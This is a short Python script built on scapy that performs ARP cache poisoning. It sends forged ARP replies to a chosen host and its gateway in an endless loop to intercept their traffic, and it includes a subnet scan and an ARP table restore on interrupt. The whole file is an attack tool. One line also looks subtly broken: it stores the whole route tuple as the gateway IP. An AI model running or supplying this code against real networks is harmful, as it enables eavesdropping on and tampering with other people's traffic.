from scapy.layers.l2 import *
from scapy.sendrecv import send


def spoofarpcache(targetip, targetmac, sourceip):
    spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
    send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
    packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
    send(packet, verbose=False)
    print("ARP Table restored to normal for", targetip)

def MultiSniffing():
    ipt = {}
    var = False
    ip = ".".join(conf.route.route("0.0.0.0")[1].split(".")[:-1]) + "."
    for num in range(1, 254):
        if str(arping(ip + str(num))[0])[-2] != "0":
            ipt[ip + str(num)] = getmacbyip(ip + str(num))
    print(ipt)


def SingleSniffing(targetip):
    if str(arping(targetip)[0])[-2] != "0" :
        targetmac = str(getmacbyip(targetip))
        gatewayip = str(conf.route.route(targetip))
        gatewaymac = str(getmacbyip(conf.route.route(targetip)[2]))
        print(gatewayip)
        try:
            print("Sending spoofed ARP responses")
            while True:
                spoofarpcache(targetip, targetmac, gatewayip)
                spoofarpcache(gatewayip, gatewaymac, targetip)
        except KeyboardInterrupt:
            print("ARP spoofing stopped")
            restorearp(gatewayip, gatewaymac, targetip, targetmac)
            restorearp(targetip, targetmac, gatewayip, gatewaymac)
            quit()
    else:
        print("Ip not reachable")


SingleSniffing(input("Which ip : "))